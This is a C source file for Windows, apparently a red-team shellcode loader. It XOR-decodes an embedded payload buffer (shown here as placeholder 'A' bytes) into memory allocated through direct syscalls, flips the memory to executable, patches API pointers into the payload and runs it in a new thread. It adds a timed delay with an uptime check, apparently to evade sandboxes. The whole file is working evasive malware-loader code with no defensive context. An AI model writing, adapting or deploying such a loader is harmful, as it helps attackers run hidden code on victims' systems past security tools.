
#include <windows.h>
#include <stdio.h>
#include "patch.h"
#include <string.h>
#include "syscalls.h"
#define msDelaynumber 10000

char data[DATA_SIZE] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";


int Delay_Exec(int number) {
	printf("[+] Running Delay Execution for %d ... \n", number);
	ULONGLONG uptimeBeforeSleep = GetTickCount64();
	typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
	PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
	LARGE_INTEGER delay;
	delay.QuadPart = -10000 * number;
	pNtDelayExecution(FALSE, &delay);
	ULONGLONG uptimeAfterSleep = GetTickCount64();
	if ((uptimeAfterSleep - uptimeBeforeSleep) < number) {
		printf("[!] Delay Execution Failed ! \n");
		return -1;
	}
	else {
		printf("[+] DONE ! \n");
	}
}


void set_key_pointers(void* buffer) {
	phear* payload = (phear*)data;

	if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
		return;

	void* gpa_addr = (void*)GetProcAddress;
	void* gmh_addr = (void*)GetModuleHandleA;

	memcpy((char*)buffer + payload->gmh_offset, &gmh_addr, sizeof(void*));
	memcpy((char*)buffer + payload->gpa_offset, &gpa_addr, sizeof(void*));
}


void run(void* buffer) {
	void (*function)();
	function = (void (*)())buffer;
	function();
}

void spawn(void* buffer, int length, char* key) {

	HANDLE hProc = GetCurrentProcess();
	HANDLE thandle = NULL;
	PVOID shellcode_addr = NULL;
	DWORD old_protect;
	unsigned long long int shellcode_length = (unsigned long long int)length;
	
	/* allocate the memory for our decoded payload */
	printf("[+] Running NtAllocateVirtualMemory ...");

	NTSTATUS NTAVM = NtAllocateVirtualMemory(
		hProc,
		&shellcode_addr,
		0,
		&shellcode_length,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	printf(" [ + ] DONE \n");

	Delay_Exec(msDelaynumber);

	printf("[+] Injecting ...");
	int x;
	for (x = 0; x < shellcode_length; x++) {
		char temp = *((char*)buffer + x) ^ key[x % 4];
		*((char*)shellcode_addr + x) = temp;
	}
	printf(" [ + ] DONE \n");

	Delay_Exec(msDelaynumber);

	/* propagate our key function pointers to our payload */
	printf("[+] Running set_key_pointers ...");
	set_key_pointers(shellcode_addr);
	printf(" [ + ] DONE \n");


	/* change permissions to allow payload to run */
	printf("[+] Running NtProtectVirtualMemory ...");

	NtProtectVirtualMemory(
		hProc,
		&shellcode_addr,
		&shellcode_length,
		PAGE_EXECUTE_READ,
		&old_protect
	);

	printf(" [ + ] DONE \n");


	Delay_Exec(msDelaynumber);

	/* spawn a thread with our data */
	printf("[+] Running NtCreateThreadEx ...");

	NtCreateThreadEx(
		&thandle,
		GENERIC_EXECUTE,
		NULL,
		hProc,
		(LPTHREAD_START_ROUTINE)&run, 
		shellcode_addr,
		FALSE,
		0,
		0,
		0, 
		NULL
	);

	printf(" [ + ] DONE \n");

	Delay_Exec(msDelaynumber);

	printf("[+] Running WaitForSingleObject ...");

	WaitForSingleObject(
		thandle,
		INFINITE
	);
	printf(" [ + ] DONE \n");


}

